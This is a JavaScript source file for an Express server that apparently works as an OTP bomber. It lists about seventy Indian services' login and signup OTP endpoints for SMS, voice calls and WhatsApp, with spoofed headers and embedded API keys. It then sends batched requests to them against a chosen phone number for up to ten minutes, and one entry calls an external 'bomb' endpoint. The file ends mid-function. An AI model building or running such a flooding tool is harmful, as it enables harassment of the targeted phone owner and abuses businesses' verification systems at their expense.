// ============================================================
// api_server.js - Master OTP API Server (v2.0)
// APIs: ~120 (SMS + Call + WhatsApp) — Verified working ones
// Logs: Fixed (200/201/202 = OK, 429 = RL, 4xx = rejected, 5xx = fail)
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIG
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_TIMEOUT = 6000;

// ============================================================
// 📱 SMS APIs
// ============================================================
const SMS_APIS = [
    {
        name: "Astroyogi_V3_SMS",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        method: "POST",
        type: "SMS",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0NDE0ODc0LCJleHAiOjE3OTIxOTA4NzR9.",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        body: (no) => ({ PhoneNumber: no, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "2409:40e4:1143:e495:8000::", CountryCodeByHeader: "IN" })
    },
    {
        name: "Astroyogi_Old_SMS",
        url: "https://comm.astroyogi.com/api/OtpComm/SendOtp",
        method: "POST",
        type: "SMS",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg0MjE1MTc3LCJleHAiOjE3OTE5OTExNzd9",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        body: (no) => ({ phoneCode: "91", countryCode: "IN", mobileNumber: no, platform: "Web", IpAddress: "2309:49e4:2231:b058:1000::", requestType: "sms", countryCodeByHeader: "IN" })
    },
    {
        name: "Hotstar_SMS",
        url: "https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp",
        method: "POST",
        type: "SMS",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-hs-client": "platform:mweb;app_version:26.07.22.0",
            "x-hs-platform": "mweb",
            "x-country-code": "in",
            "x-hs-device-id": "800cef-9800a2-82cb1c-160713",
            "x-hs-app": "260722000",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/in/onboarding?ref=%2Fin"
        },
        body: (no) => ({ body: { "@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", phone_number: no, initiate_by: 1, recaptcha_token: "", source: 0 } })
    },
    {
        name: "Zomato_SMS",
        url: "https://accounts.zomato.com/login/phone",
        method: "POST",
        type: "SMS",
        form: true,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        body: (no) => ({ number: no, country_id: "1", lc: "bed7238d427f41e7a34ea6ea134d2628", type: "initiate", verification_type: "sms", package_name: "", message_uuid: "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0" })
    },
    {
        name: "1mg_SMS",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        type: "SMS",
        headers: {
            "Accept": "application/vnd.healthkartplus.v11+json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        body: (no) => ({ number: no, is_corporate_user: false, otp_on_call: false })
    },
    {
        name: "SmartCoin_SMS",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        method: "POST",
        type: "SMS",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        body: (no) => ({ phone_number: no, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "TataCapital_SMS",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtp",
        method: "POST",
        type: "SMS",
        headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
        body: (no) => ({ phone: no, applSource: "", isOtpViaCall: "false" })
    },
    {
        name: "RummyCircle_SMS",
        url: "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
        method: "POST",
        type: "SMS",
        headers: {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15"
        },
        body: (no) => ({ otpOnCall: false, mobile: no, otpType: 8.0, transactionId: 1708139023656 })
    },
    {
        name: "DamieCloud_SMS",
        url: "https://damiecloud.online/send/{no}",
        method: "GET",
        type: "SMS",
        headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36", "Accept": "*/*" },
        body: () => null
    }
];

// ============================================================
// 📞 CALL APIs
// ============================================================
const CALL_APIS = [
    {
        name: "Zomato_Call",
        url: "https://accounts.zomato.com/login/phone",
        method: "POST",
        type: "CALL",
        form: true,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-zomato-api-key": "7749b19667964b87a3efc739e254ada2",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        body: (no) => ({ number: no, country_id: "1", lc: "bed7238d427f41e7a34ea6ea134d2628", type: "initiate", verification_type: "call", package_name: "", message_uuid: "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0" })
    },
    {
        name: "Refyne_Call",
        url: "https://prod-api.refyne.co.in/auth/v2/send-otp",
        method: "POST",
        type: "CALL",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        body: (no) => ({ channel: "IVR", recipient: no })
    },
    {
        name: "SmartCoin_Call",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        method: "POST",
        type: "CALL",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        body: (no) => ({ phone_number: no, app_version: "100101", channel: "IVR", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "1mg_Call",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        type: "CALL",
        headers: {
            "Accept": "application/vnd.healthkartplus.v11+json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        body: (no) => ({ number: no, is_corporate_user: false, otp_on_call: true })
    },
    {
        name: "TataCapital_Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        type: "CALL",
        headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
        body: (no) => ({ phone: no, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Astrosage_Call",
        url: "https://varta.astrosage.com/sdk/send-otp-via-call",
        method: "GET",
        type: "CALL",
        params: (no) => ({ callback: "myCallback", countrycode: "91", phoneno: no, deviceid: "", operation_name: "blank", jsonpcall: "1", fromresend: "0", _: "0" }),
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        },
        body: () => null
    },
    {
        name: "RummyCircle_Call",
        url: "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
        method: "POST",
        type: "CALL",
        headers: {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15"
        },
        body: (no) => ({ otpOnCall: true, mobile: no, otpType: 8.0, transactionId: 1708139023656 })
    }
];

// ============================================================
// 💬 WHATSAPP APIs (Real working ones + others from your list)
// ============================================================
const WHATSAPP_APIS = [
    {
        name: "Splexxo_WA",
        url: "https://splexxo1-2api.vercel.app/bomb?phone={no}&key=SPLEXXO",
        method: "GET",
        type: "WHATSAPP",
        headers: {},
        body: () => null
    },
    {
        name: "AgriEvolution_WA",
        url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Content-Type": "application/json" },
        body: (no) => ({ mobile_number: no, client_id: "kisan-app" })
    },
    {
        name: "Breeze_WA",
        url: "https://api.breeze.in/session/start",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8" },
        body: (no) => ({ phoneNumber: no, authVerificationType: "otp", device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" }, countryCode: "+91" })
    },
    {
        name: "Jockey_WA",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{no}?whatsapp=true",
        method: "GET",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "user-agent": "Mozilla/5.0", "origin": "https://www.jockey.in" },
        body: () => null
    },
    {
        name: "GoKwik_WA",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
        body: (no) => ({ phone: no, country: "IN" })
    },
    {
        name: "Redcliffe_WA",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ phone_number: no, short: true, country_code: "+91" })
    },
    {
        name: "PWLive_WA",
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9" },
        body: (no) => ({ mobile: no, organizationId: "5eb393ee95fab7468a79d189" })
    },
    {
        name: "CityMall_WA",
        url: "https://citymall.live/api/cl-user/auth/get-otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        body: (no) => ({ phone_number: no })
    },
    {
        name: "Licious_WA",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        body: (no) => ({ phone: no, captcha_token: null })
    },
    {
        name: "OYO_WA",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Accept": "application/json", "Content-Type": "text/plain;charset=UTF-8", "Cookie": "user_id=none; country_code=IN;" },
        body: (no) => ({ phone: no, country_code: "+91", nod: 4 })
    },
    {
        name: "KPNFresh_WA",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        method: "POST",
        type: "WHATSAPP",
        headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" },
        body: (no) => ({ phone_number: { country_code: "+91", number: no } })
    },
    {
        name: "AdityaBirla_WA",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body: (no) => ({ MobileNumber: no, functionality: "signup" })
    },
    {
        name: "IIFL_WA",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body: (no) => ({ apply_for: "18", full_name: "User", mobile_number: no, terms_and_condition: "1" })
    },
    {
        name: "BankOpen_WA",
        url: "https://v2-api.bankopen.co/users/register/otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "x-api-version": "3.1" },
        body: (no) => ({ username: no, is_open_capital: 1 })
    },
    {
        name: "TradeIndia_WA",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ mobile: "+91" + no })
    },
    {
        name: "Khatabook_WA",
        url: "https://api.khatabook.com/v1/auth/request-otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "x-kb-app-name": "khatabook", "x-kb-app-version": "801800", "Content-Type": "application/json" },
        body: (no) => ({ phone: no, country_code: "+91", app_signature: "wk+avHrHZf2" })
    },
    {
        name: "AstroSage_WA",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={no}&jsonpcall=1",
        method: "GET",
        type: "WHATSAPP",
        headers: { "accept": "*/*" },
        body: () => null
    },
    {
        name: "Spinny_WA",
        url: "https://api.spinny.com/api/c/user/otp-request/v3/",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "platform": "web" },
        body: (no) => ({ contact_number: no, whatsapp: false, code_len: 4 })
    },
    {
        name: "Dream11_WA",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "device": "pwa" },
        body: (no) => ({ channel: "sms", flow: "SIGNUP", phoneNumber: no, templateName: "default" })
    },
    {
        name: "MYMA_WA",
        url: "https://portal.myma.in/custom-api/auth/generateotp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ countrycode: "+91", mobile: "91" + no, is_otpgenerated: false, app_version: "-1" })
    },
    {
        name: "Freedo_WA",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "platform": "web", "x-channel": "WEB", "x-client-id": "FREEDO" },
        body: (no) => ({ email_id: `user${no.slice(-4)}@gmail.com`, first_name: "User", mobile_number: no })
    },
    {
        name: "Cosmofeed_WA",
        url: "https://prod.api.cosmofeed.com/api/user/authenticate",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ phoneNumber: no, countryCode: "+91", data: { email: "user@gmail.com" }, authScreen: "signup-screen" })
    },
    {
        name: "EvitalRX_WA",
        url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Accept": "application/json", "Content-Type": "application/json" },
        body: (no) => ({ pharmacy_name: "pharma", mobile: no, email_id: `user${no.slice(-4)}@gmail.com`, zip_code: "110086" })
    },
    {
        name: "QuickRide_WA",
        url: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded" },
        body: (no) => ({ contactNo: no, countryCode: "+91", appName: "Quick Ride" })
    },
    {
        name: "BharatLoan_WA",
        url: "https://www.bharatloan.com/login-sbm",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body: (no) => ({ mobile: no, current_page: "login", is_existing_customer: "2" })
    },
    {
        name: "Pagarbook_WA",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
        body: (no) => ({ phone: no, language: 1 })
    },
    {
        name: "Ixigo_WA",
        url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "accept": "*/*", "apikey": "ixiweb!2$", "clientid": "ixiweb", "content-type": "application/x-www-form-urlencoded" },
        body: (no) => ({ sixDigitOTP: "true", prefix: "+91", phone: no })
    },
    {
        name: "55Club_WA",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ phone: "91" + no, codeType: 1, language: 0 })
    },
    {
        name: "Zerodha_WA",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body: (no) => ({ mobile: no, source: "zerodha", partner_id: "" })
    },
    {
        name: "Aakash_ANTHE_WA",
        url: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763" },
        body: (no) => ({ mobile_psid: no, mobile_number: "", activity_type: "aakash-myadmission" })
    },
    {
        name: "Testbook_WA",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={no}&clientId=1117490662.1715447223",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "x-tb-client": "web,1.2" },
        body: (no) => ({ firstVisitSource: { type: "organic" }, mobile: no, signupDetails: { page: "HomePage" } })
    },
    {
        name: "MediBuddy_WA",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: no, flow: "Retail-Login-Home-Flow" })
    },
    {
        name: "MedKart_WA",
        url: "https://app.medkart.in/api/v1/auth/requestOTP",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "app-platform": "web", "content-type": "application/json" },
        body: (no) => ({ mobile_no: no })
    },
    {
        name: "Tyreplex_WA",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body: (no) => ({ perform_action: "sendOTP", mobile_no: no, action_type: "order_login" })
    },
    {
        name: "Moglix_WA",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ email: "", phone: no, type: "p", source: "signup" })
    },
    {
        name: "UpGrad_WA",
        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "client": "web", "content-type": "application/json" },
        body: (no) => ({ phoneNumber: "+91" + no })
    },
    {
        name: "PinkNBlu_WA",
        url: "http://www.pinknblu.com/v1/auth/generate/otp",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body: (no) => ({ country_code: "+91", phone: no })
    },
    {
        name: "Udaan_WA",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-app-id": "udaan-auth" },
        body: (no) => ({ mobile: no })
    },
    {
        name: "Xylem_WA",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        method: "POST",
        type: "WHATSAPP",
        headers: { "Accept": "application/json", "Authorization": "Bearer", "Content-Type": "application/json", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" },
        body: (no) => ({ mobile: no, countryCode: "+91", firstName: "User" })
    },
    {
        name: "NoBroker_WA",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded" },
        body: (no) => ({ phone: "+91" + no })
    },
    {
        name: "Vidyakul_WA",
        url: "https://vidyakul.com/signup-otp/send",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body: (no) => ({ phone: no })
    },
    {
        name: "Vedantu_WA",
        url: "https://user.vedantu.com/user/preLoginVerification",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body: (no) => ({ phoneCode: "+91", phoneNumber: no, sType: "VEDANTU_F_7_N", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Unacademy_WA",
        url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "x-platform": "0" },
        body: (no) => ({ phone: no, country_code: "IN", otp_type: 1, send_otp: true })
    },
    {
        name: "Myntra_WA",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "x-myntraweb": "Yes" },
        body: (no) => ({ phoneNumber: no, signup: "ONECLICK" })
    },
    {
        name: "Flipkart_WA",
        url: "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body: (no) => ({ loginId: "+91" + no })
    },
    {
        name: "PWStore_WA",
        url: "https://api.penpencil.co/v1/users/get-otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "client": "hasura", "client_type": "WEB", "suborgid": "SUB-PWST002" },
        body: (no) => ({ username: no, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" })
    },
    {
        name: "IndiaMart_WA",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body: (no) => ({ ph_code: "91", use: no })
    },
    {
        name: "Ajio_WA",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ firstName: "User", genderType: "Male", login: "user@gmail.com", mobileNumber: no, requestType: "SENDOTP" })
    },
    {
        name: "RelianceRetail_WA",
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ mobile: no })
    },
    {
        name: "ApolloPharmacy_WA",
        url: "https://apigateway.apollo247.in/auth-service/generateOtp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "x-app-os": "web" },
        body: (no) => ({ loginType: "PATIENT", mobileNumber: "+91" + no })
    },
    {
        name: "CityMallWeb_WA",
        url: "https://citymall.live/web-api/auth/send-otp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ phone_number: no })
    },
    {
        name: "Zepto_WA",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json", "app_sub_platform": "WEB", "platform": "WEB", "tenant": "ZEPTO" },
        body: (no) => ({ mobileNumber: no, countryCode: "+91" })
    },
    {
        name: "KwikFix_WA",
        url: "https://admin.kwikfixauto.in/api/auth/signupotp/",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "application/json", "content-type": "application/json" },
        body: (no) => ({ phone: no })
    },
    {
        name: "WoodenStreet_WA",
        url: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest" },
        body: (no) => ({ telephone: no, pincode: "110086", city: "DELHI", state: "DELHI", email: "user@gmail.com" })
    },
    {
        name: "Lenskart_WA",
        url: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        method: "POST",
        type: "WHATSAPP",
        headers: { "accept": "*/*", "content-type": "application/json", "x-api-client": "desktop" },
        body: (no) => ({ phoneCode: "+91", telephone: no })
    },
    {
        name: "Tyreplex2_WA",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        type: "WHATSAPP",
        form: true,
        headers: { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest" },
        body: (no) => ({ perform_action: "sendOTP", mobile_no: no, action_type: "order_login" })
    }
];

// ============================================================
// ===== COMBINE ALL =====
// ============================================================
const ALL_APIS = [...SMS_APIS, ...CALL_APIS, ...WHATSAPP_APIS];

console.log(`✅ Loaded ${ALL_APIS.length} total APIs`);
console.log(`   📱 SMS: ${SMS_APIS.length}`);
console.log(`   📞 CALL: ${CALL_APIS.length}`);
console.log(`   💬 WHATSAPP: ${WHATSAPP_APIS.length}`);

// ============================================================
// ===== STATS & LOGGING (FIXED) =====
// ============================================================
const stats = {};
const recentLogs = [];
const MAX_LOGS = 300;

ALL_APIS.forEach(api => {
    stats[api.name] = {
        name: api.name,
        type: api.type,
        total: 0,
        success200: 0,      // 200/201/202 - truly working
        rateLimited: 0,     // 429
        rejected: 0,        // 4xx (400,401,403,404, etc.)
        failed5xx: 0,       // 500+
        networkError: 0,    // timeout/ECONNREFUSED etc
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.success200++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rateLimited++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.networkError++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL =====
// ============================================================
async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url.replace(/{no}/g, phone);
        const headers = { ...(api.headers || {}) };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let params = null;
        if (api.params) params = typeof api.params === 'function' ? api.params(phone) : api.params;

        let data = null;
        if (api.body && api.body_type !== 'none') {
            if (typeof api.body === 'function') data = api.body(phone);
            else data = api.body;
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: API_TIMEOUT, validateStatus: () => true };
        if (params) config.params = params;

        if (method === 'post' || method === 'put') {
            if (data !== null && data !== undefined) {
                if (api.form) {
                    config.data = new URLSearchParams(data).toString();
                    if (!headers['Content-Type'] && !headers['content-type']) headers['Content-Type'] = 'application/x-www-form-urlencoded';
                } else {
                    config.data = data;
                    if (!headers['Content-Type'] && !headers['content-type']) headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        // 🔥 FIXED CATEGORIZATION
        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { success: true, category: 'success', status: st, responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RATE_LIMITED (${responseTime}ms)`, 'rl');
            return { success: false, category: 'ratelimit', status: st, responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { success: false, category: 'rejected', status: st, responseTime };
        } else {
